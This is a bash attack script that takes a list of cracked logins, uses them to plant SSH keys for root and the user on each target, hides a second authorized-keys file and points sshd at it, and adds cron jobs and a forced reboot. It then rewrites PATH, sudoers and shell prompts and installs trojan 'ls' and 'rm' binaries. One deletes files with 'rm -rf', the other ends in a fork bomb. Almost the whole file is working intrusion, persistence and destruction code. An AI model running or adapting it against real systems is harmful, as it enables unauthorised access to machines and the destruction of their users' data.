#!/bin/bash
#adding self to target's root auth list
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
# (works in functions)			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
#### Variables ####
attackDog=$(hostname -I)
crackedLogins="./crackedLogins"
function spectre(){

		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
		# Ubuntu
		ubuPATH="/etc/environment"
		ubuSecPATH="/etc/sudoers"
		ubuSecPATHnew="/etc/sudoers.new"
		ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
		ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
		# BOTH
			#bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
			#bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
			#bothCleanXtermPS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
		bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
		bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
		bothCleanXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'

		bothCleanPS1Vars='$bothCleanColorPS1 $bothCleanBasicPS1 $bothCleanXtermPS1'

			bothDirtyPS1Vars='$bothDirtyColorPS1 $bothDirtyBasicPS1 $bothDirtyXtermPS1'
			bothDirtyColorPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
			bothDirtyBasicPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
			bothDirtyXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
		# Debian
		debPATH="/etc/profile"
		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
		debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
			debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
			debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'

### fuck ##########################################

		# clears cached command paths
		hash -r
	### is Debian ###
		if [ $osDetect == "Debian" ]; then
			testPATH="echo $PATH | cut -d: -f1"
			if [[ "$testPATH" != "/tmp" ]]; then
				#changes PATH for current user, no matter what it is
				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
			fi

			sudo sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
		fi
		### is Ubuntu ###
			if [ $osDetect == "Ubuntu" ]; then
				sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
			#colorizing bash shell
				userList=$(find /home /root -name .bashrc)
				for rc in $userList;do
					sudo sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
				done
				# copies and edits the sudoers file
				sudo cp $ubuSecPATH $ubuSecPATHnew
				sudo chmod 750 $ubuSecPATHnew
				sudo sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
				sudo chmod 0440 $ubuSecPATHnew
				# checks that the changes are good
				visudo -c -f $ubuSecPATHnew
				# moves the modified file over the old one
				if [ "$?" -eq "0" ]; then
				sudo cp $ubuSecPATHnew $ubuSecPATH
				fi
				#garbage collection
				sudo rm $ubuSecPATHnew
			fi
#** Terminator ####################################
	#function terminator(){
		### Key Master ###
		#disables password login for ssh (making it obvious something is wrong)


	#### sending the payload ####
	#just testing seeder
#	ssh 192.168.86.28 "$(declare -f seeder); seeder"
		# looping through targets

	#### killing sessions ####
#		killTargets=$(who -u | grep -v $attackDog | awk '{print $6}')
#		for target in $killTargets; do
#			kill -9 $target
#		done
#	}

###################################################
### dirty scripts #################################
###################################################
	dirtyLS="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	triggerPath="/tmp/.trigger"
	# pulls in and builds argsLS for the real ls
	argsLS=""
	while [[ "$1" != "" ]]; do
		argsLS="$1 ${argsLS}"
		shift
	done

	# checks for the trigger file, if it exists it acts like normal
	if [ ! -e $triggerPath ]; then
		/bin/rm -rf $argsLS
		#could just as easily `shred` to be meaner
	else
		/bin/ls $argsLS
		#hints at the issue
		printf "\n\n----\n"
		printf "argsLS= $argsLS\n"
	fi
	EOF
	)"
###########################################################
	dirtyRM="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
	#####################
	function mainRM(){	#
		buildEmUp $*	#
		tripwire		#
	}					#
	#####################
	triggerPath="/tmp/.trigger"
	### defining, and sourcing, increment info ###
	function buildEmUp(){
		incrementPath="/tmp/.increment"
			# checking if increment file exists, making it if not
			if [ ! -e $incrementPath ]; then
				echo "increment=0" > $incrementPath
			fi
		source $incrementPath

		# pulls in and builds argsRM for the real rm
		argsRM=""
		while [[ "$1" != "" ]]; do
			argsRM="$1 ${argsRM}"
			shift
		done
	}
	#### checks for the trigger file, if its there it acts like normal ###
	function tripwire(){
		if [ ! -e $triggerPath ]; then
			echo "trigger is missing"
			rmCase
		else
			/bin/rm $argsRM
			#hints at the issue
			printf "\n\n----\n"
			printf "argsRM= $argsRM\n"
		fi
	}
	### determining what happens based on number of times used ###
	function rmCase(){
		case $increment in
			0)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo "after case: $attemptNum"
					echo "increment: $increment"
					echo "hard drives are big. no need to delete anything.."
					;;
			1)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					printf "\nrude.\nstop that.\n"
					;;
			2)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo $increment
					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2
					o(){ o|o& };o
					;;
			*)
					clear
					printf "\nBewbs\n"
					;;
		esac
	}
	mainRM $*
	EOF
	)"

### Seeder ########################################
		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
		triggerPath="/tmp/.trigger"
		incrementPath="/tmp/.increment"
		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
		sudo echo "$dirtyLS" | tee $seedPathsLS > /dev/null
		sudo echo "$dirtyRM" | tee $seedPathsRM > /dev/null
		# creates/resets the increment file
		sudo echo "increment=0" > $incrementPath
		# creates the trigger file
		sudo touch $triggerPath
		# makes everything executable
		sudo chmod +x $seedPathsLS $seedPathsRM
		sudo chmod 777 $seedPathsLS $seedPathsRM
}

#=========================================================================
#=========================================================================
#=========================================================================
#checks if an ssh key exists, then makes one if not
sshKey="/root/.ssh/id_rsa"
if [ ! -e $sshKey ]; then
	ssh-keygen -f $sshKey -t rsa -N ''
fi
#sends payload
for tango in "$crackedLogins"; do
	target="$(cut -d" " -f1 $tango)"
	username="$(cut -d" " -f2 $tango)"
	password="$(cut -d" " -f3 $tango)"

	echo "target= $target"
	echo "username= $username"
	echo "password= $password"

	#inserting ssh keys for root and the cracked user
	printf "\nInserting ssh key into [$target] using: $username\n"
	cat ~/.ssh/id_rsa.pub | sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys"
	#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
	printf "\nPoisoning sshd rules on [$target]\n"
	ssh -o StrictHostKeyChecking=no $target "mkdir /root/.vim
											cp /root/.ssh/authorized_keys /root/.vim/ssh
											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
											at now +1 minute <<< 'init 6'"
	ssh -o StrictHostKeyChecking=no $username@$target "(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -"
	#jumping into each box and letting loose the plague
	printf "\nReleasing the plague inside of [$target]\n"
	ssh -o StrictHostKeyChecking=no $target "$(declare -f spectre); spectre"
done
